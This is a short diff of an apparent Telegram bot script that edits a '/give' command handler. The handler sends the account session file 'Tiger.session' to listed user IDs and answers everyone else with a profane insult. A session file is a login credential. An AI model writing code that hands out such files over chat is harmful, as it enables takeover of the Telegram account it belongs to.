@@ -197,10 +197,10 @@ async def op(event):
 
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
-  if not event.sender_id == legendx:
-    return await event.reply("please don't use me fuck off 🥺")
+  if not event.sender_id in tiger:
+    return await event.reply("please don't use me fuck off 😒")
   try:
-    await event.reply("session bot file", file="Tiger.session")
+    await event.reply("session file", file="Tiger.session")
   except Exception as e:
     print (e)
 
